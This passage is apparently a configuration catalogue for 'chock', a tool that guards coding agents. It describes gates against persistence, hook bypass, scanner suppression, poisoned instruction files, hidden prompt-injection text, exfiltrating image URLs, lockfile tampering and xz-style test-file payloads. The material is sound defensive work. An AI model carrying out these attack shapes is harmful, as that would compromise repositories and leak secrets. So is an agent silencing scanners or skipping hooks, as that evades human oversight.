    directory needs no per-file rows. `relative` says whether a bare relative name may match (`always`, `code` for
    interpreter text only, `never`). Nothing waives a refusal in-band: the person runs the command themselves.
block-persistence-shapes:
  solves: |
    Publishing a package, making a repository public, or leaving something running after the session ends are
    the steps a supply-chain worm takes next, and each is one shell line an agent can be talked into. This guard
    reads the command and refuses publishes, registry-auth edits, user services, launch agents, scheduled jobs,
    Run keys, ssh login keys, runner registration, sudoers edits, setuid bits and detached downloads. It asks
    before a release or a new remote. It is friction on the command text, not a security boundary.
  customise: |
    The verbs, flags and paths are data in `implementations/data/shapes.json`; add a program or a path there and an
    eval case beside it. Keep the `as_of` date current, since CI fails the table a year after it.

agentic-code-security:
  solves: |
    The OWASP Top 10 for Agentic Applications lists what goes wrong when an agent is built carelessly, and most of
    the entries leave a mark in code or config a static read can see: a code executor that runs on the host, an MCP
    server launched at whatever version the registry serves today, a tool that hands the model's string to a shell,
    a human approval switched off, the whole environment passed to a child process, certificate checks disabled.
    Each is one line, easy to write while wiring an agent and easy to miss in review. This gate reads the code and
    the MCP and agent client configs an agent writes and refuses those constructs as they are written and again at
    commit, naming the rule, its CWE and OWASP ASI entry, and the fix. It refuses only what is new, so adopting it in
    an existing repository does not start by rejecting what is already there. It is a static read: a sandbox that is
    badly designed but never says `use_docker: False` passes, which is why the advisory OWASP ASI policies stay.
  customise: |
    Choose verdicts, not patterns, in `.chock/agentic-security.json` (a different file from java-security's
    `.chock/security.json`, so a repository can carry both): `{"version": 1, "packs": {"exec": {"verdict": "deny"},
    "bounds": {"verdict": "deny"}, "supply": {"rules": {"supply-hf-unpinned-revision": "deny"}}}}`. A pack or a rule
    is `allow` or `deny`; a rule may differ from its pack; a pack or rule the file does not name runs at its default.
    The noisy heuristics (bounds, prompt-memory, supply-hf-unpinned-revision) start as `allow`. A single line is
    waived by a human reviewer with `# chock: allow <rule-id>` (`//` in JavaScript); the agent's own waiver is
    refused, and a JSON config, which has no comments, is waived in the selection file. The rule catalogue in
    `references/rule-catalogue.md` lists every rule with its weakness, ASI entry and fix.
scan-suppression-markers:
  solves: 'An agent told to make a scanner pass can silence the scanner instead of fixing the finding:
    an inline ignore marker, an entry in a scanner''s ignore file, or a CI security step told to pass
    when it fails. This gate asks a person before such a change lands, so a suppression is a decision
    a person made, not one an agent slipped into a diff. Only what the change adds is judged; suppressions
    already committed stay quiet.'
  customise: 'A reviewed false positive is kept by a person committing from their own shell with CHOCK_ALLOW=scan-suppression-markers
    set for that one commit. Ship it under `rollout: observe` in .chock/config.yaml first, read the gate
    log, and move to enforce once the asks it records are the ones you want asked. To stop judging the
    policy, list it under policies.disabled.'
block-hook-bypass-in-files:
  solves: block-no-verify refuses an agent's command that skips git hooks, but not the same skip written into a file that runs later. A hook-skip option in a release script, core.hooksPath set by a package.json prepare script, HUSKY=0 or SKIP= in a Makefile, or an uninstall in a setup script switches the hooks off for everyone who runs it. This gate reads the lines a change adds to hook launchers, scripts and build files, and flags each such line. It warns while its false-positive rate is measured, then blocks.
  customise: 'The scoped files are `applies_to.paths` in the manifest and the pattern is `content_pattern`; widen either there. A reviewed bypass is kept by a person with `pragma: allowlist hook-bypass` on the line (a JSON file such as package.json cannot carry it). In the agent a waiver counts only for a line already in HEAD.'
ci-github-actions-security:
  solves: >-
    An agent that writes CI writes the workflow most likely to be attacked. Text from an issue or pull
    request expanded into `run:`, a pull_request_target job that builds the pull request's own code, a token
    left at write-all, `secrets: inherit` to another repository's workflow, a self-hosted runner open to
    forks, or a cache restored into a release each hand a stranger the repository's secrets in one line.
    This gate reads workflows, composite actions and dependabot.yml with a YAML key-path scanner and reports
    each such weakness a change adds, naming its rule, CWE, OWASP CI/CD risk and fix. It warns while its
    false-positive rate is measured, then a separate change makes it block.
  customise: >-
    The curated action lists (agent actions, caches, publishers, auto-merge, cloud-key inputs) are
    `implementations/ghascan/data/actions.json`; the rules and their tiers are
    `implementations/ghascan/rules.py`. A person keeps a reviewed finding with `# chock: allow <rule id>` on
    its line; in the agent a waiver counts only for a line already in HEAD. Unpinned actions stay with
    pin-github-actions, not this gate.
dockerfile-compose-security:
  solves: An agent asked to make a container work reaches for the shortcuts that make it work fastest -- run as root, mount the Docker socket, turn on privileged, skip TLS, bake a password into an ENV, build FROM whatever tag is current. Each one hands the container, or whoever controls a base image or URL, the host. This gate reads the Dockerfiles and compose files a change writes, follows build stages, ARGs, line continuations, heredocs and YAML anchors, and names each such construct with its weakness and fix. It warns while its false-positive rate is measured, then blocks; forms another gate already refuses on one line are left to that gate.
  customise: 'Each finding names its rule id (dk-* for Dockerfiles, cm-* for compose). A person keeps a reviewed construct with `# chock: allow <rule-id>` on the line or on the comment line directly above it (for a Dockerfile, above the instruction), committing from their own shell; in the agent a waiver counts only for a line already in HEAD. Rules carry a deny or ask tier for the later enforce stage; until then every finding warns.'
package-lifecycle-scripts:
  solves: Install-time and build-time hooks are how recent supply-chain worms spread (Shai-Hulud's preinstall, Phantom Gyp's binding.gyp, setup.py command overrides). A hook an agent adds runs on every machine that installs the package, before anyone reads it. This gate reads package manifests and build files across npm, Python, Rust, Go, .NET, Ruby, PHP and the JVM, and reports each install- or build-time hook a change adds or edits, and each git or URL dependency without a commit pin. It warns while its false-positive rate is measured; the script already sorts hooks that download, decode or evaluate code (to block) from other new hooks (to ask).
  customise: 'The file names and detectors live in `implementations/lifecycle/` (`dispatch.py` maps a file name to its detector; `signals.py` holds the download, decode and inline-code patterns; `npm.py` holds the allowed husky `prepare` values). There is no waiver yet: the gate only warns. Promotion to enforce adds a sidecar waiver, since package.json and TOML cannot carry an inline one.'
lockfile-integrity:
  solves: 'A lockfile is thousands of generated lines nobody reads, which makes it the quiet place to point one package at another server, drop its hash or re-hash a version already locked. This gate reads the lockfile formats of twelve package managers and refuses those changes, at commit and while the agent writes, judging only what the change adds.'
  customise: 'A reviewed private registry or mirror host goes in `.chock/registry-allowlist.txt` (one host or `*.domain` per line), committed before the lock that uses it; only the committed file counts. The default registries per ecosystem are `DEFAULT_HOSTS` in `implementations/lockscan/sources.py`. Start with `rollout: observe` and read the gate log before enforcing.'
scan-secret-files:
  solves: 'scan-secrets reads one line at a time, so it cannot tell that a whole file is a credential. A kubeconfig with an inline token, a service-account JSON, Terraform state, an `.npmrc` or `.git-credentials`, a PKCS#12 store or a browser cookie database leaks the moment it is committed, and renaming it does not change what it is. This script judges every file a change writes, by name and by shape (kubeconfig, JSON and INI shapes, PEM and PuTTY key blocks, DER and keystore headers), and flags the ones that are secrets. Templates (`.env.example`) stay allowed. It warns while its false-positive rate is measured, then blocks.'
  customise: 'The name tables and shapes are constants in `implementations/sbf_*.py`. Test, fixture, example, doc, lock and eval paths ask instead of refusing. There is no inline waiver (binary and JSON files cannot carry one); a person who has reviewed a fixture commits it from their own shell with `CHOCK_ALLOW=scan-secret-files`. Not caught: a renamed binary key store other than PKCS#12, JKS/JCEKS and DER keys (BKS, KeePass, GnuPG keyrings are not judged at all), and an encrypted DER PKCS#8 key; YAML over the scanner''s 1 MiB limit (a file with a `kind: Config` key it cannot read is still flagged); JSON this reader cannot parse is flagged only when it holds a credential file''s keys; keys and values split across lines or encoded (UTF-16, base64), tfvars heredocs and Maven CDATA passwords; `.env` and tfvars keys that are not secret-like names, and low-entropy values that are paths or plain URLs (or sit under a `_FILE`, `_PATH`, `_NAME` or `_URL` key); a value holding a template word (example, changeme); `.pgpass` under another name, a renamed netrc that opens with a comment, a renamed git credential store holding any other line; `env.production` (no leading dot); `.yarnrc.yml`, `.gem/credentials`, `.s3cfg`, `.my.cnf`, `.htpasswd`, IDE data sources; notebook widget state and metadata. A key block missing its END line and re-wrapped under 40 characters per line, or a key interleaved with padding lines, is missed (neither loads as a key); random-looking text between key armor lines (a 32-character ID, an alphabet placeholder) is read as key bytes. A Java store with no key-protector OID asks (a truststore, often committed on purpose); PGP private keys always refuse. When one run holds both a refusal and an ask, the script exits with the refusal even if only the ask is new. Credentials in URIs, inline CLI passwords and high-entropy values are scan-secrets'' and the entropy tier''s.'

refname-filename-metachar:
  solves: >
    Names a shell, CI step or git can misread. Paths a change adds or renames into, and branches
    and tags pushed, can carry command substitution, an IFS expansion, a backtick, a shell
    operator, a control or bidi character, a base64-decode shape, a leading dash or a trailing
    space or dot in a segment, or a '..' segment; a ref can also have a full commit id's shape.
  customise: >
    No waiver: if a name is truly required, a person creates it from their own shell. This is
    friction, not a boundary.
scan-instruction-files:
  solves: 'An instruction file (AGENTS.md, CLAUDE.md, a rules folder, a skill, a prompt) is obeyed by every
    agent that opens the repository, so one poisoned line in it hijacks them all: overriding the rules, hiding
    work from a person, approving tools, skipping hooks, fetching and running code, or sending secrets away.
    This gate asks a person before a change adds such text, and refuses outright secret exfiltration and
    encoded payloads. Only what the change adds is judged, plus guardrail statements it deletes or weakens.'
  customise: 'Ship it under `rollout: observe` in .chock/config.yaml first and read the gate log before
    enforcing. A person answers an ask by committing from their own shell with CHOCK_ALLOW=scan-instruction-files
    for that one commit, and waives a refusal with ''chock: allow instruction-scan'' on the line. To stop judging
    the policy, list it under policies.disabled.'
scan-hidden-content:
  solves: 'A page can show a reviewer one thing and an agent another. A comment the renderer never shows, a span styled
    out of sight, white or zero-size text, or a Word run marked hidden can carry instructions an agent reads and a person
    never sees; an image URL whose query holds a token or a data-shaped part sends data out the moment the page is
    rendered. This gate reads what a change adds to Markdown, HTML, SVG, XML and Word files, agent instruction files,
    docs and issue or pull-request templates, and flags each such comment, hidden element and URL. It warns while its
    false-positive rate is measured; a later release asks, and blocks a URL whose query names a secret.'
  customise: 'A reviewed line is kept by a person with `chock: allow scan-hidden-content` on it, or on a comment line
    just above, committed from their own shell; in the agent a waiver counts only for a line already in HEAD. A Word
    document cannot carry the waiver. The host allowlist and the vocabulary live in the policy''s data table; widening
    them is a change to the policy.'
opaque-blob-guard:
  solves: A payload hidden in a test file is how the xz backdoor reached the build (a corrupt-looking xz test file, extracted by an m4 macro at configure time). Reviewers read source, not binaries, and tests/, fixtures/, testdata/ and vendor/ are where unreadable files are expected. This gate reads each changed file in those paths by its first bytes, whatever its name, and also flags a random-looking file over 100 KB, a symlink that leaves the repository, build text (m4, configure, Makefile.am) that decodes and evaluates, and a changed gradle wrapper jar with no new distributionSha256Sum. It warns while its false-positive rate is measured.
  customise: 'The signatures, scoped folders, entropy limits, build-text patterns and the known gradle wrapper hashes (empty by default, a list of lowercase sha256) live in `implementations/data/*.json`. A file that must stay is listed as `<sha256>  <path>` in `.chock/blob-allowlist.txt`: both must match, one malformed line ignores the whole list, and at tool use and in an agent''s commit only entries already in HEAD count, but a person''s commit and CI read the staged list, so keep that file under code-owner review. Known limits: shell sinks written as a variable (`$SHELL`), a newline after the pipe, assign-then-eval and redirect-then-run are not recognised; a repo_root whose own name is a scoped folder loses that scope; offset-0 signatures only (a prefixed archive, text-encoded data of any size, and known media headers followed by random bytes are missed); only the first 4 MiB is entropy-sampled; folders outside the scoped list are not judged, and folder names match by exact case and spelling (`Vendor`, `VENDOR`, `Spec`, `third-party`, `test-data` are not scoped); a payload split across many small files, a Python bytecode file and a Git LFS pointer are not recognised; a commit of several thousand in-scope files can exceed the runner''s 30 s script budget and is then left undecided; a Makefile that runs a script under tests/ (`sh tests/run.sh`) or a `| sh` within 2000 characters of an unrelated decompressor line is asked about; the runner quotes odd file names (a double quote or backslash) so such files may never reach the gate.'
